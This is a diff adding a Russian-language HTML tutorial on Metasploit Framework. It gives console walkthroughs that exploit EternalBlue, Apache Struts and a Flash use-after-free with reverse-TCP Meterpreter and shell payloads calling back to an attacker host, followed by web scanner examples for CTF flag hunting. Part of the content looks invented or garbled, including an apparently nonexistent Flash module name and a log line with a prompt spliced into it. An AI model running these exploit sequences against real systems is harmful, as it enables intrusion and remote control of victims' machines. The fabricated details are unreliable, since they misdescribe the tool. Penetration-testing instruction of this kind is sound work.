@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Инструкция по Metasploit Framework</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Source+Code+Pro&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@tailwindcss/browser@latest"></script>
+    <link rel="stylesheet" href="metasploit.css">
+</head>
+<body class="bg-gray-100">
+    <div class="container">
+        <h1 class="section-title">Инструкция по Metasploit Framework</h1>
+
+        <section class="section-content">
+            <p>
+                Metasploit Framework - это мощная платформа для разработки и выполнения эксплойтов. Она предоставляет инструменты для тестирования на проникновение, обнаружения уязвимостей и разработки эксплойтов.
+            </p>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Что такое Metasploit Framework?</h2>
+            <p>
+                Metasploit Framework - это модульная платформа, состоящая из различных компонентов, называемых модулями. Эти модули предназначены для выполнения определенных задач в процессе пентестинга, таких как:
+            </p>
+            <ul>
+                <li><strong>Exploits:</strong> Использование известных уязвимостей в системах или приложениях.</li>
+                <li><strong>Payloads:</strong> Код, который выполняется на целевой системе после успешной эксплуатации.</li>
+                <li><strong>Encoders:</strong> Инструменты для обфускации эксплойтов, чтобы избежать обнаружения системами безопасности.</li>
+                <li><strong>Listeners:</strong> Компоненты, которые ждут входящих соединений от целевой системы после эксплуатации.</li>
+                <li><strong>Auxiliary:</strong> Модули для выполнения различных задач, таких как сканирование, сбор информации и другие.</li>
+            </ul>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Когда используется Metasploit Framework?</h2>
+            <p>
+                Metasploit Framework используется в различных ситуациях, связанных с кибербезопасностью:
+            </p>
+            <ul>
+                <li><strong>Пентестинг:</strong> Для оценки безопасности систем и сетей путем имитации атак злоумышленников.</li>
+                <li><strong>Тестирование уязвимостей:</strong> Для обнаружения и проверки наличия уязвимостей в программном обеспечении и системах.</li>
+                <li><strong>Разработка эксплойтов:</strong> Для создания и тестирования новых эксплойтов для известных или недавно обнаруженных уязвимостей.</li>
+                <li><strong>Обучение безопасности:</strong> Для изучения методов атак и защиты от них в контролируемой среде.</li>
+            </ul>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Обнаружение уязвимостей с помощью Metasploit Framework</h2>
+            <p>
+                Metasploit Framework может использоваться для обнаружения уязвимостей различными способами:
+            </p>
+            <ol>
+                <li><strong>Использование модулей сканирования:</strong> Metasploit содержит вспомогательные модули, которые можно использовать для сканирования целевых систем на наличие известных уязвимостей. Например, модуль <code>auxiliary/scanner/mssql/mssql_login</code> может использоваться для проверки слабых учетных данных для серверов Microsoft SQL.</li>
+                <li><strong>Импорт результатов сканирования:</strong> Metasploit позволяет импортировать результаты сканирования, выполненные другими инструментами, такими как Nmap. Это позволяет использовать информацию об обнаруженных уязвимостях для выбора подходящих эксплойтов.</li>
+                <li><strong>Ручной поиск уязвимостей:</strong> Опытные пользователи могут вручную искать уязвимости в программном обеспечении или системах, а затем использовать Metasploit для разработки и тестирования эксплойтов для этих уязвимостей.</li>
+            </ol>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Топ эксплойтов Metasploit Framework</h2>
+            <p>
+                Metasploit Framework содержит множество эксплойтов для различных платформ и приложений. Вот некоторые из наиболее популярных и часто используемых эксплойтов с подробными примерами:
+            </p>
+            <ul>
+                <li>
+                    <h3 class="example-title">exploit/windows/smb/ms17_010_eternalblue</h3>
+                    <p>
+                        Эксплойт, использующий уязвимость EternalBlue в протоколе SMBv1 для получения удаленного выполнения кода на системах Windows.
+                    </p>
+                    <div class="example-code">
+                        <pre><code>
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.100
+RHOST => 192.168.1.100
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.0.101
+LHOST => 192.168.0.101
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.101:4444
+[*] 192.168.1.100:445 - Attempting to trigger the vulnerability...
+[*] 192.168.1.100:445 - Sending stage (204288 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened (192.168.0.101:4444 -> 192.168.1.100:49162) at 2024-07-24 12:00:00 +0000
+
+meterpreter > sysinfo
+Computer Name:    VICTIM
+OS:              Windows 7 (Build 7601, Service Pack 1)
+Architecture:    x64
+System Language:    ru_RU
+Domain:          WORKGROUP
+Logged On Users: 1
+meterpreter > 
+                        </code></pre>
+                    </div>
+                </li>
+                <li>
+                    <h3 class="example-title">exploit/linux/http/apache_struts_cmd_exec</h3>
+                    <p>
+                        Эксплойт, использующий уязвимость в Apache Struts для выполнения произвольных команд на сервере.
+                    </p>
+                    <div class="example-code">
+                        <pre><code>
+msf6 > use exploit/linux/http/apache_struts_cmd_exec
+msf6 exploit(linux/http/apache_struts_cmd_exec) > set RHOST 192.168.1.105
+RHOST => 192.168.1.105
+msf6 exploit(linux/http/apache_struts_cmd_exec) > set TARGETURI /struts2-showcase/
+TARGETURI => /struts2-showcase/
+msf6 exploit(linux/http/apache_struts_cmd_exec) > set PAYLOAD linux/x86/shell/reverse_tcp
+PAYLOAD => linux/x86/shell/reverse_tcp
+msf6 exploit(linux/http/apache_struts_cmd_exec) > set LHOST 192.168.0.101
+LHOST => 192.168.0.101
+msf6 exploit(linux/http/apache_struts_cmd_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.101:4444
+[*] Sending request to /struts2-showcase/ with command 'id'
+[*] Command shell session 2 opened (192.168.0.101:4444 -> 192.168.1.105:34567) at 2024-07-24 12:05:00 +0000
+
+sh-4.1$ whoami
+apache
+sh-4.1$ 
+                        </code></pre>
+                    </div>
+                </li>
+                <li>
+                    <h3 class="example-title">exploit/multi/browser/adobe_flash_player_uaf_use_after_free</h3>
+                    <p>
+                        Эксплойт, использующий уязвимость use-after-free в Adobe Flash Player для выполнения кода в браузере пользователя.
+                    </p>
+                    <div class="example-code">
+                        <pre><code>
+msf6 > use exploit/multi/browser/adobe_flash_player_uaf_use_after_free
+msf6 exploit(multi/browser/adobe_flash_player_uaf_use_after_free) > set SRVHOST 0.0.0.0
+SRVHOST => 0.0.0.0
+msf6 exploit(multi/browser/adobe_flash_player_uaf_use_after_free) > set LHOST 192.168.0.101
+LHOST => 192.168.0.101
+msf6 exploit(multi/browser/adobe_flash_player_uaf_use_after_free) > set PAYLOAD windows/x86/meterpreter/reverse_tcp
+PAYLOAD => windows/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/browser/adobe_flash_player_uaf_use_after_free) > exploit
+
+[*] Starting exploit handler
+[*] Started HTTP listener on 0.0.0.0:8080
+[*] 192.168.0.101:8080 - Server started.
+[*] Run the following command in your browser: msf6 exploit(multi/browser/adobe_flash_player_uaf_use_after_free) > [*] http://192.168.0.101:8080/
+[*] 192.168.0.101:8080 - 192.168.1.102 requested /
+[*] 192.168.0.101:8080 - Sending HTML payload ...
+[*] 192.168.0.101:8080 - Sending Flash payload ...
+[*] 192.168.1.102:51671 - Client connected
+[*] 192.168.1.102:51671 - Sending stage (769536 bytes) to 192.168.1.102
+[*] Meterpreter session 3 opened (192.168.0.101:4444 -> 192.168.1.102:51671) at 2024-07-24 12:10:00 +0000
+
+meterpreter > getuid
+Server username:    DESKTOP-VICTIM\user
+meterpreter > 
+                        </code></pre>
+                    </div>
+                </li>
+            </ul>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Эксплойты для обнаружения уязвимостей и флагов на сайтах</h2>
+            <p>
+                Metasploit Framework в основном используется для эксплуатации уязвимостей, но он также содержит вспомогательные модули для обнаружения уязвимостей, которые могут привести к обнаружению флагов на сайтах:
+            </p>
+            <ul>
+                <li>
+                    <h3 class="example-title">auxiliary/scanner/http/dir_scanner</h3>
+                    <p>
+                        Этот модуль сканирует веб-сервер на наличие скрытых каталогов и файлов, которые могут содержать конфиденциальную информацию, включая флаги.
+                    </p>
+                    <div class="example-code">
+                         <pre><code>
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.100
+RHOSTS => 192.168.1.100
+msf6 auxiliary(scanner/http/dir_scanner) > set WORDLIST /usr/share/wordlists/dirb/common.txt
+WORDLIST => /usr/share/wordlists/dirb/common.txt
+msf6 auxiliary(scanner/http/dir_scanner) > run
+
+[*] 192.168.1.100:80 - Found directory: / флаги/
+[*] 192.168.1.100:80 - Found directory: / секреты/
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+                        </code></pre>
+                    </div>
+                </li>
+                <li>
+                    <h3 class="example-title">auxiliary/scanner/http/http_version</h3>
+                    <p>
+                       Этот модуль определяет версию HTTP, используемую веб-сервером.  Это может помочь выявить устаревшие версии, которые могут иметь известные уязвимости.
+                    </p>
+                     <div class="example-code">
+                        <pre><code>
+msf6 > use auxiliary/scanner/http/http_version
+msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.100
+RHOSTS => 192.168.1.100
+msf6 auxiliary(scanner/http/http_version) > run
+[*] 192.168.1.100:80 Server: Apache/2.4.29 (Ubuntu)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+                        </code></pre>
+                    </div>
+                </li>
+            </ul>
+            <p>
+                Хотя эти модули и не предназначены специально для извлечения флагов, они могут помочь в процессе разведки и обнаружения уязвимостей, которые в конечном итоге могут привести к обнаружению флагов.
+            </p>
+        </section>
+    </div>
+</body>
+</html>
